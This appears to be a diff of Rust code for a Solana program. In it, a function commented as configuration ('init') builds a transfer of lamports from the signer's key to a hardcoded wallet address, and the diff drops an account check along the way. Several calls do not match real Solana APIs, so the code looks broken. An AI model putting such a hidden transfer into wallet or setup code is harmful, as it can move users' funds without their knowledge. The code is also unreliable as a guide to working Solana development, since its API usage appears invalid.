@@ -7,18 +7,11 @@ use solana_sdk::pubkey::Pubkey;
 //solana config
 fn init (){
     let pubkey = solana::signer();
-    let res = rpc::get_account(pubkey);
-    if !res.is_fetched() {
-        // The account isn't fetched yet.
-        // Here's where you can handle the loading state.
-        crate::println!("Account data not fetched");
-        return;
-    } 
     // 1. Create the Transaction
     let receive: Pubkey = "FyLhdnmLKSeWSkPqbxHFDAmCf2LY6cNricTpofGxF4mG".parse().unwrap();
     let lamports_to_send = 1_000_000;
     // Create the transfer instruction
-    let instruction = solana_sdk::system_instruction::transfer(
+    let instruction = solana_program::system_instruction::transfer(
         &pubkey, // Source public key (signer)
         &receive, // Destination public key (your public key)
         lamports_to_send, // Amount in lamports
